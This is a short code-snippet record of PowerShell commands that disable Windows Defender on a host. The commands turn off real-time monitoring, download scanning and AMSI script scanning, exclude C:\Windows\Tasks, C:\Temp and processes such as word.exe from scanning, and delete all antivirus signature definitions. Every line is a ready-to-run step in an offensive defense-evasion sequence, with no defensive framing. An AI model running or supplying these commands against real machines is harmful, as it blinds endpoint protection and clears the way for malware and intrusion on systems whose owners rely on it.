---
id: f09e4a3e-86f0-473b-9305-b91d06687c51
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:26.616426+00:00'
updated_at: '2023-04-10T20:37:03.358908+00:00'
---

# Code Snippet f09e4a3e

**Language**: Powershell

```powershell
# Check the status of Windows Defender
PS C:\> Get-MpComputerStatus

# Disable scanning all downloaded files and attachments, disable AMSI (reactive)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true

# Disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# Exclude a folder from Windows Defender scanning
PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"

# Remove signatures (if Internet connection is present, they will be downloaded again):
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```


